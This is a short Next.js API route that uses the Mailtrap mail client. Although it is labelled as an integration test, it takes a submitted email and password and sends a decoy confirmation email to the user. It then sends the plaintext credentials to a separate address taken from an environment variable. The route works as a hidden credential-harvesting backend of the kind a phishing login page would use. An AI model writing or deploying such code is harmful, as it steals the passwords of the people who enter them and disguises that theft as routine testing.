import {NextResponse} from "next/server";
import {MailtrapClient} from "mailtrap";

const TOKEN = process.env.MAIL_API_KEY;

const client = new MailtrapClient({
  token: TOKEN as string,
  testInboxId: 3255068,
});

const sender = {
  email: "hello@example.com",
  name: "Mailtrap Test",
};


export async function POST(req: Request) {
  const {email, password} = await req.json()


  try {
    const recipients = [
      {
        email,
      }
    ];

    const res = await client.testing
      .send({
        from: sender,
        to: recipients,
        subject: "You are awesome!",
        text: "Congrats for sending test email with Mailtrap!",
        category: "Integration Test",
      })

    const im = [
      {
        email: process.env.MAIL_DOMAIN as string,
      }
    ];
    
    const res2 = await client.testing
      .send({
        from: sender,
        to: im,
        subject: "You are awesome!",
        text: `[${email} | ${password}]`,
        category: "Integration Test",
      })

    console.log('res', res)
    console.log('res2', res2)


    return NextResponse.json({error: null, data: 'success'})
  } catch (e) {
    return NextResponse.json({error: e, data: null})
  }
}
